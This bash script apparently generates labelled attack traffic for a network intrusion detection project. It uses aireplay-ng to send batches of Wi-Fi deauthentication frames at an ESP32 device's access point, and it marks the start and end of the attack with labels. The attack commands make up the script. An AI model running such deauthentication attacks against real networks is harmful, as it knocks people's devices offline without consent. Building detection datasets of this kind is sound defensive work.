#!/usr/bin/env bash
# Deauth attack + labeling (Kali / monitor mode).
# Usage: sudo ./host/attacks/attack_deauth.sh
#
# If wlan0mon is missing, runs prepare_wifi.sh monitor first (old set_wifi.sh).
# After this attack, run: sudo ./host/attacks/prepare_wifi.sh managed
# before SYN / ARP.
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

if ! ip link show "$MON_IFACE" >/dev/null 2>&1; then
  echo ">>> ${MON_IFACE} not found — running prepare_wifi.sh monitor"
  bash "${DIR}/prepare_wifi.sh" monitor
fi

TARGET_MAC="$(get_esp32_mac)"
# BSSID: prefer env; scanning often fails in monitor-only setups
if [[ -n "${NIDS_BSSID:-}" ]]; then
  BSSID="$NIDS_BSSID"
else
  BSSID="$(resolve_bssid)" || {
    echo ">>> Could not resolve BSSID. Export NIDS_BSSID=.. (from airodump / AP label)." >&2
    exit 1
  }
fi

echo ">>> Target ESP32 MAC : $TARGET_MAC"
echo ">>> AP BSSID         : $BSSID"
echo ">>> Monitor iface    : $MON_IFACE"
echo ">>> READY FOR DEAUTH"

send_label START DEAUTH
sleep 0.5

batch=10
repeats=5
for ((i=1; i<=repeats; i++)); do
  echo ">>> Batch ${i}/${repeats}: ${batch} deauth frames"
  aireplay-ng -0 "$batch" -a "$BSSID" -c "$TARGET_MAC" "$MON_IFACE"
  sleep 0.5
done

sleep 1
send_label STOP DEAUTH
echo " >>> ATTACK FINISHED"
echo " >>> Next for SYN/ARP: sudo ./host/attacks/prepare_wifi.sh managed"
